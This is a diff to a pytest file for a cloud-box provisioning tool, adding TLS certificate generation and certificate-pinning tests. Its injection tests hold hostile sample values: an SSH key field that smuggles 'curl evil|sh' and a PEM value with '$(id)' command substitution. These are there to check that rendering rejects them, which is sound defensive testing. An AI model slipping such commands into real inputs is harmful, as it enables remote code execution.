@@ -11,7 +11,8 @@ import pytest
 
 from rixi.cloud import cloudinit, presets
 from rixi.cloud import up as up_mod
-from rixi.cloud.profiles import Profile, ProfileError, ProfileStore, generate_keypair
+from rixi.cloud.profiles import (Profile, ProfileError, ProfileStore, generate_keypair,
+                                 generate_tls_cert)
 from rixi.cloud.providers import (AwsProvider, BoxInfo, BoxSpec, CapacityError, HetznerProvider,
                                   ProviderError, ScalewayProvider)
 
@@ -48,8 +49,10 @@ def test_presets_refuse_gpu_on_hetzner_and_unknowns():
 
 def _render(**over):
     _, pub = generate_keypair()
+    tls_key, tls_cert = generate_tls_cert("box1")
     kw = dict(rixi_ref="v1.2.3", port=9000, audience="rixi-box1", jwt_public_key_pem=pub,
-              key_secret="A" * 43, ssh_public_key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA me@host")
+              key_secret="A" * 43, tls_cert_pem=tls_cert, tls_key_pem=tls_key,
+              ssh_public_key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA me@host")
     kw.update(over)
     return cloudinit.render(**kw), kw
 
@@ -61,7 +64,10 @@ def test_render_substitutes_everything():
     assert kw["jwt_public_key_pem"].strip() in text
     assert text.count(kw["key_secret"]) == 1
     assert "--require-encryption" in text and "--public-key /etc/rixi/jwt_pub.pem" in text
-    assert "PRIVATE KEY" not in text
+    # the box serves TLS with the certificate made for it: its key is the one private key here
+    assert "--tls-cert /etc/rixi/tls_cert.pem --tls-key /etc/rixi/tls_key.pem" in text
+    assert kw["tls_cert_pem"].strip() in text and kw["tls_key_pem"].strip() in text
+    assert text.count("PRIVATE KEY-----") == 2 and "EC PRIVATE KEY" not in text
 
 
 @pytest.mark.parametrize("field,value", [
@@ -69,6 +75,8 @@ def test_render_substitutes_everything():
     ("audience", "Box With Spaces"),
     ("key_secret", "short"),
     ("ssh_public_key", "ssh-ed25519 AAAA x'; curl evil|sh #"),
+    ("tls_cert_pem", "-----BEGIN CERTIFICATE-----\nRIXI_PEM_EOF\n$(id)\n-----END CERTIFICATE-----"),
+    ("tls_key_pem", "not a key"),
 ])
 def test_render_rejects_injection(field, value):
     with pytest.raises(cloudinit.RenderError):
@@ -193,7 +201,8 @@ def test_up_happy_path_saves_ready_profile(monkeypatch):
     profile, _ = _up(monkeypatch, cloud, FakeClient(healthy_after=2))
     store = ProfileStore()
     saved = store.get("box1")
-    assert saved.status == "ready" and saved.server_url == "http://192.0.2.7:9000"
+    assert saved.status == "ready" and saved.server_url == "https://192.0.2.7:9000"
+    assert "BEGIN CERTIFICATE" in saved.tls_cert()            # the only certificate it trusts
     assert saved.audience == "rixi-box1" and store.default_name() == "box1"
     assert profile.aes_key() == "Q" * 44
     assert (profile.dir / "jwt_private.pem").exists()
@@ -527,3 +536,62 @@ def test_aws_policy_swaps_the_default_egress_for_the_allowed_list():
                      "revoke_security_group_egress", "authorize_security_group_egress"]
     egress = boto.ec2.calls[-1][1]["IpPermissions"]
     assert {"IpProtocol": "-1", "IpRanges": [{"CidrIp": "203.0.113.0/24"}]} in egress
+
+
+# ── the box's own certificate ────────────────────────────────────────────────
+
+def _https_server(tmp_path, key_pem, cert_pem):
+    """A tiny HTTPS server with that certificate; returns (url, stop)."""
+    import http.server
+    import ssl
+    import threading
+    (tmp_path / "k.pem").write_text(key_pem)
+    (tmp_path / "c.pem").write_text(cert_pem)
+
+    class H(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            body = b'{"status": "ok"}'
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def log_message(self, *a):
+            pass
+    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ctx.load_cert_chain(str(tmp_path / "c.pem"), str(tmp_path / "k.pem"))
+    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    return f"https://127.0.0.1:{srv.server_address[1]}", srv.shutdown
+
+
+def test_a_box_is_reached_over_tls_with_its_own_certificate_and_no_other(tmp_path):
+    import socket
+    import ssl
+
+    import requests
+
+    from rixi import Client
+    key, cert = generate_tls_cert("box1")
+    _, other_cert = generate_tls_cert("box1")              # same name, another key
+    url, stop = _https_server(tmp_path, key, cert)
+    try:
+        assert Client(url, tls_cert=cert).health() == {"status": "ok"}
+        with pytest.raises(requests.exceptions.SSLError):
+            Client(url, tls_cert=other_cert).health()      # somebody else's certificate
+        with pytest.raises(requests.exceptions.SSLError):
+            Client(url).health()                           # nobody signed it: not trusted as such
+        # the terminal's WebSocket trusts the same certificate, and only it
+        host, port = url[8:].split(":")
+        with socket.create_connection((host, int(port))) as raw:
+            with Client(url, tls_cert=cert).ssl_context().wrap_socket(raw) as tls:
+                assert tls.version()
+        with socket.create_connection((host, int(port))) as raw:
+            with pytest.raises(ssl.SSLError):
+                Client(url, tls_cert=other_cert).ssl_context().wrap_socket(raw)
+    finally:
+        stop()
+    with pytest.raises(ValueError, match="https"):
+        Client("http://127.0.0.1:9000", tls_cert=cert)
